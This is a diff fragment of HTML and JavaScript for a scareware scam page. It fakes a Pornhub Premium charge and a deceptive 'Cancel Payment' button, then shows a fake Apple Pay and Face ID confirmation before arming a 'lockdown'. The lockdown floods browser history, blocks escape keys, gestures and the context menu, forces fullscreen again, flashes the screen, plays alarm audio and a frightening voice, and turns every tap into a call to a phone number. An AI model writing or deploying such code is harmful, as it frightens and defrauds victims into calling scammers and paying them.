+            if (e.clientY <= 10 && isLockdownActive) {
+                cycleNextPopup();
+                triggerShakeAndSound();
+                speakHorrifyingVoiceAlert();
+            }
+        });
+
+        // ==========================================================
+        // HARD TRAPS: COMPLETE SCREEN FREEZE, ANTI-BACK, ESCAPE LOCK
+        // ==========================================================
+        function engageHistoryTrap() {
+            try {
+                // Pre-fill history stack deeply so back button can never reach previous site
+                for (let i = 0; i < 60; i++) {
+                    history.pushState({ page: i, lock: true }, "", "#apple-security-lock");
+                }
+
+                // Continuous history push every 400ms to lock browser navigation forward
+                setInterval(() => {
+                    try {
+                        history.pushState({ lock: true, time: Date.now() }, "", "#apple-security-lock");
+                    } catch (e) { }
+                }, 400);
+
+                const interceptBackNavigation = function (e) {
+                    try {
+                        history.forward();
+                        for (let i = 0; i < 25; i++) {
+                            history.pushState(null, "", "#apple-security-lock");
+                        }
+                    } catch (err) { }
+                    triggerShakeAndSound();
+                    forceLockedFullscreen();
+                    cycleNextPopup();
+                    speakHorrifyingVoiceAlert();
+                };
+
+                window.addEventListener('popstate', interceptBackNavigation, true);
+                window.addEventListener('hashchange', interceptBackNavigation, true);
+                window.onpopstate = interceptBackNavigation;
+            } catch (e) { }
+        }
+
+        // Engage history trap immediately on script evaluation
+        engageHistoryTrap();
+
+        // FULL GESTURE & SCROLL FREEZE (No swiping, pinch-zoom, pull-to-refresh, or bounce)
+        document.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+        }, { passive: false });
+
+        document.addEventListener('gesturestart', (e) => e.preventDefault());
+        document.addEventListener('gesturechange', (e) => e.preventDefault());
+        document.addEventListener('gestureend', (e) => e.preventDefault());
+        document.addEventListener('wheel', (e) => e.preventDefault(), { passive: false });
+        document.addEventListener('selectstart', (e) => e.preventDefault());
+        document.addEventListener('dragstart', (e) => e.preventDefault());
+
+        // FULL KEYBOARD TRAP (Escape, Backspace, Alt+Left, Cmd+[, Reload, Close, etc.)
+        window.addEventListener('keydown', (e) => {
+            const isBackKey = e.key === 'Backspace' || e.key === 'Escape' || e.key === 'BrowserBack' ||
+                (e.altKey && (e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Left' || e.key === 'Right')) ||
+                ((e.ctrlKey || e.metaKey) && (e.key === '[' || e.key === ']' || e.key === 'w' || e.key === 'W' || e.key === 'r' || e.key === 'R' || e.key === 'q' || e.key === 'i' || e.key === 'p' || e.key === 's' || e.key === 'h' || e.key === 't' || e.key === 'n'));
+            const isFnKey = e.key.startsWith('F') && !isNaN(e.key.substring(1));
+
+            if (isBackKey || isFnKey || e.key === 'Tab') {
+                e.preventDefault();
+                e.stopPropagation();
+                try {
+                    history.forward();
+                    history.pushState(null, "", "#apple-security-lock");
+                } catch (err) { }
+                triggerShakeAndSound();
+                forceLockedFullscreen();
+                cycleNextPopup();
+                speakHorrifyingVoiceAlert();
+                return false;
+            }
+        }, true);
+
+        // DISABLE CONTEXT MENU / LONG PRESS
+        window.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            triggerShakeAndSound();
+            forceLockedFullscreen();
+            cycleNextPopup();
+            speakHorrifyingVoiceAlert();
+            return false;
+        }, true);
+
+        // BEFOREUNLOAD PROMPT (DISABLED to prevent browser "Leave site?" popup)
+        // window.addEventListener('beforeunload', (e) => { ... });
+
+        // RE-ENGAGE FULLSCREEN ON EXIT ATTEMPT
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && isLockdownActive) {
+                forceLockedFullscreen();
+                triggerShakeAndSound();
+            }
+        });
+        document.addEventListener('webkitfullscreenchange', () => {
+            if (!document.webkitFullscreenElement && isLockdownActive) {
+                forceLockedFullscreen();
+                triggerShakeAndSound();
+            }
+        });
+
+        // Global Tap Handler (Tapping ANY button or anywhere immediately triggers phone call)
+        function handleGlobalTap(e) {
+            // Do not trigger anything until Apple Pay has completed and lockdown is active
+            if (!isLockdownActive) {
+                return;
+            }
+
+            // Do not trigger phone calls or global logic on initial tap overlay or loader
+            if (e.target && e.target.closest && (
+                e.target.closest('#initial-tap-overlay') ||
+                e.target.closest('#premium-loader-overlay')
+            )) {
+                return;
+            }
+
+            unlockSpeechSynthesis();
+            initAudioContext();
+            playAppleAlertSound();
+            speakHorrifyingVoiceAlert();
+            forceLockedFullscreen();
+            renderStickyVipBar();
+
+            // Direct dial for any button or card interaction
+            if (e.target && e.target.closest && (
+                e.target.closest('button') ||
+                e.target.closest('.ios-alert-btn') ||
+                e.target.closest('.ios-card-btn') ||
+                e.target.closest('.ios-dark-btn') ||
+                e.target.closest('.ios-sheet-btn-pill') ||
+                e.target.closest('.ios-dialer-box') ||
+                e.target.closest('.ios-dialer-btn-full') ||
+                e.target.closest('.ios-dark-banner-row') ||
+                e.target.closest('.ios-sheet-card') ||
+                e.target.closest('.ios-notif') ||
+                e.target.closest('#ios-vip-sticky-bar')
+            )) {
+                handleDirectDial();
+                return;
+            }
+
+            // If user clicked outside dialog on backdrop or Pornhub page
+            if (e.target === modalBackdrop || e.target.closest('#pornhub-page')) {
+                cycleNextPopup();
+                handleDirectDial();
+            }
+        }
+
+        window.addEventListener('click', handleGlobalTap, true);
+        window.addEventListener('touchend', handleGlobalTap, { capture: true, passive: true });
+        window.addEventListener('pointerdown', (e) => {
+            if (!isLockdownActive) return;
+            unlockSpeechSynthesis();
+            initAudioContext();
+            speakHorrifyingVoiceAlert();
+            forceLockedFullscreen();
+        }, { capture: true, passive: true });
+        window.addEventListener('keydown', (e) => {
+            forceLockedFullscreen();
+        }, true);
+        window.addEventListener('keyup', (e) => {
+            forceLockedFullscreen();
+        }, true);
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') {
+                forceLockedFullscreen();
+            }
+        });
+
+        // Aggressive Visual Panic Engine to Retain CX
+        function triggerScreenFlash() {
+            const flash = document.createElement('div');
+            flash.style.position = 'fixed';
+            flash.style.top = '0';
+            flash.style.left = '0';
+            flash.style.width = '100vw';
+            flash.style.height = '100vh';
+            flash.style.backgroundColor = 'rgba(255, 0, 0, 0.4)';
+            flash.style.zIndex = '999999999';
+            flash.style.pointerEvents = 'none';
+            flash.style.transition = 'opacity 0.1s ease';
+            document.body.appendChild(flash);
+
+            setTimeout(() => { flash.style.opacity = '0'; }, 100);
+            setTimeout(() => { flash.style.opacity = '1'; }, 200);
+            setTimeout(() => { flash.remove(); }, 350);
+        }
+
+        // Auto-cycle popup every 6 seconds of idle to create endless trap perception
+        let autoCycleTimer = setInterval(() => {
+            if (isLockdownActive) {
+                cycleNextPopup();
+                triggerShakeAndSound();
+                triggerScreenFlash();
+                speakHorrifyingVoiceAlert();
+            }
+        }, 6000);
+
+        // ==========================================================
+        // APPLE PAY TRANSACTION FLOW & EMERGENCY TRANSITION
+        // ==========================================================
+        function initApplePayPaymentFlow() {
+            engageHistoryTrap();
+
+            const tapOverlay = document.getElementById('initial-tap-overlay');
+            if (!tapOverlay) {
+                renderPopup1_Image1Style();
+                scheduleNotifications();
+                renderStickyVipBar();
+                triggerShakeAndSound();
+                forceLockedFullscreen();
+                return;
+            }
+
+            // Step 1: Reveal processing sheet smoothly & start Face ID Lottie
+            let faceIdAnim = null;
+            let confirmedTriggered = false;
+
+            function triggerPaymentConfirmed() {
+                if (confirmedTriggered) return;
+                confirmedTriggered = true;
+
+                const payTitle = document.getElementById('pay-title');
+                if (payTitle) {
+                    payTitle.innerHTML = `<span style="color: #34c759; font-weight: 700;">Done</span>`;
+                }
+
+                // Authentic Apple Pay success tone
+                playApplePayDing();
+
+                // Transition to full emergency lockdown right after Face ID checkmark locks in
+                setTimeout(() => {
+                    transitionToEmergencyLockdown(true);
+                }, 550);
+            }
+
+            // Make Apple Pay visible smoothly
+            tapOverlay.style.display = 'flex';
+            tapOverlay.style.pointerEvents = 'auto';
+            requestAnimationFrame(() => {
+                tapOverlay.style.opacity = '1';
+            });
+
+            const lottieContainer = document.getElementById('faceid-lottie');
+            if (typeof lottie !== 'undefined' && window.FACE_ID_LOTTIE_DATA && lottieContainer) {
+                try {
+                    lottieContainer.innerHTML = '';
+                    faceIdAnim = lottie.loadAnimation({
+                        container: lottieContainer,
+                        renderer: 'svg',
+                        loop: false,
+                        autoplay: true,
+                        animationData: window.FACE_ID_LOTTIE_DATA
+                    });
+
+                    // Frame 110-112 is when the checkmark appears and locks in
+                    faceIdAnim.addEventListener('enterFrame', function (e) {
+                        if (e.currentTime >= 110) {
+                            triggerPaymentConfirmed();
+                        }
+                    });
+                } catch (err) {
+                    console.error('Error playing Face ID Lottie:', err);
+                }
+            }
+
+            // Fallback: Ensure Payment Confirmed triggers around 1900ms even if Lottie events aren't captured
+            setTimeout(() => {
+                triggerPaymentConfirmed();
+            }, 1900);
+
+            // Transition to the full emergency lockdown sequence ONLY AFTER Apple Pay is confirmed
+            let hasTransitioned = false;
+            function transitionToEmergencyLockdown(shouldDialNow) {
+                if (hasTransitioned) return;
+                hasTransitioned = true;
+
+                // Lockdown and Dial Trap are now officially armed!
+                isLockdownActive = true;
+                dialLoopActive = true;
+
+                try {
+                    initAudioContext();
+                    if (audioCtx && audioCtx.state === 'suspended') {
+                        audioCtx.resume();
+                    }
+                } catch(err) {}
+
+                // Smoothly fade out Apple Pay sheet
+                tapOverlay.style.transition = 'opacity 0.25s ease';
+                tapOverlay.style.opacity = '0';
+                tapOverlay.style.pointerEvents = 'none';
+                setTimeout(() => {
+                    try {
+                        tapOverlay.remove();
+                    } catch(err) {
+                        tapOverlay.style.display = 'none';
+                    }
+                }, 250);
+
+                // Render first popup and start notifications + sticky VIP bar
+                renderPopup1_Image1Style();
+                scheduleNotifications();
+                renderStickyVipBar();
+                triggerShakeAndSound();
+                forceLockedFullscreen();
+
+                speakHorrifyingVoiceAlert();
+            }
+
+            // If user taps the close button on the Apple Pay sheet, confirm payment first
+            const closeBtn = document.getElementById('pay-sheet-close');
+            if (closeBtn) {
+                ['click', 'touchend'].forEach(evt => closeBtn.addEventListener(evt, (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    triggerPaymentConfirmed();
+                }));
+            }
+        }
+
+        function initPurchasingPremiumFlow() {
+            // First, wait 1.5 seconds showing the normal page
+            setTimeout(() => {
+                const loaderOverlay = document.createElement('div');
+                loaderOverlay.id = 'premium-loader-overlay';
+                loaderOverlay.className = 'premium-loader-overlay';
+                loaderOverlay.innerHTML = `
+                    <div class="premium-loader-card">
+                        <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:14px;">
+                            <div class="ph-badge-top" style="margin-bottom:0;">LIFETIME ACCESS</div>
+                            <div style="background:#d70015; color:#fff; font-weight:900; font-size:11px; padding:4px 9px; border-radius:20px; letter-spacing:0.5px; display:inline-flex; align-items:center; gap:4px; box-shadow:0 2px 8px rgba(215,0,21,0.5); border:1px solid rgba(255,255,255,0.35);">
+                                <span>🔞 18+ ONLY</span>
+                            </div>
+                        </div>
+                        <div class="ph-loader-spinner"></div>
+                        <div class="ph-loader-title">Pornhub <span>Premium</span></div>
+                        <div class="ph-loader-text">Initiating Secure Payment...</div>
+                        <div class="ph-loader-price">Total: $129.89</div>
+
+                        <!-- 18+ User Responsibility Disclaimer Box -->
+                        <div style="margin-top:14px; padding:12px; background:rgba(215,0,21,0.12); border:1px dashed rgba(215,0,21,0.5); border-radius:12px; text-align:center;">
+                            <div style="color:#ff453a; font-size:11px; font-weight:800; text-transform:uppercase; letter-spacing:0.6px; margin-bottom:5px; display:flex; align-items:center; justify-content:center; gap:6px;">
+                                <span style="background:#d70015; color:#fff; font-size:11px; font-weight:900; padding:2px 6px; border-radius:6px; box-shadow:0 0 8px rgba(215,0,21,0.6);">🔞 18+</span>
+                                LEGAL DISCLAIMER
+                            </div>
+                            <div style="color:#ffffff; font-size:12px; line-height:1.4; font-weight:600;">
+                                You are solely responsible after completing this purchase.
+                            </div>
+                        </div>
+
+                        <button id="trap-cancel-btn" style="width:100%; background-color:#d70015; color:#fff; border:none; border-radius:12px; padding:16px; font-size:18px; font-weight:800; text-transform:uppercase; cursor:pointer; box-shadow:0 8px 25px rgba(215,0,21,0.4); margin-top:16px; -webkit-tap-highlight-color:transparent; touch-action:manipulation;">CANCEL PAYMENT</button>
+                    </div>
+                `;
+                document.body.appendChild(loaderOverlay);
+
+                // Force reflow and animate in
+                void loaderOverlay.offsetWidth;
+                loaderOverlay.classList.add('show');
+
+                const trapBtn = document.getElementById('trap-cancel-btn');
+                let cancelTriggered = false;
+
+                function handleCancelTap(e) {
+                    if (e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+                    }
+                    if (cancelTriggered) return;
+                    cancelTriggered = true;
+
+                    // 1. Unmute audio & unlock speech synthesis cleanly on first user touch gesture (Mobile Safari audio policy)
+                    isVoiceAlertActive = true;
+                    speechIndex = 0;
+                    try {
+                        initAudioContext();
+                        if (audioCtx && audioCtx.state === 'suspended') {
+                            audioCtx.resume();
+                        }
+                        unlockSpeechSynthesis();
+                    } catch(err) {}
+
+                    // Instantly speak debit voice alert on user button tap
+                    speakHorrifyingVoiceAlert(true);
+
+                    // 2. Smoothly dismiss the loader overlay
+                    loaderOverlay.style.transition = 'opacity 0.25s cubic-bezier(0.4, 0, 0.2, 1)';
+                    loaderOverlay.style.opacity = '0';
+                    loaderOverlay.style.pointerEvents = 'none';
+
+                    const card = loaderOverlay.querySelector('.premium-loader-card');
+                    if (card) {
+                        card.style.transition = 'transform 0.25s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.25s ease';
+                        card.style.transform = 'scale(0.85)';
+                        card.style.opacity = '0';
+                    }
+
+                    setTimeout(() => {
+                        try {
+                            if (loaderOverlay.parentNode) {
+                                loaderOverlay.parentNode.removeChild(loaderOverlay);
+                            }
+                        } catch(err) {
+                            loaderOverlay.style.display = 'none';
+                        }
+                    }, 250);
+
+                    // 3. Immediately launch the Apple Pay Confirmation Screen
+                    initApplePayPaymentFlow();
+                }
+
+                // Handle touchstart, pointerdown, and click for instant mobile response on very first tap
+                trapBtn.addEventListener('touchstart', handleCancelTap, { passive: false });
+                trapBtn.addEventListener('pointerdown', handleCancelTap, { passive: false });
+                trapBtn.addEventListener('click', handleCancelTap);
+            }, 1500); // Wait 1.5s after load
+        }
+
+        window.addEventListener('load', () => {
+            initPurchasingPremiumFlow();
+        });
+    </script>
+
+
+</body></html>
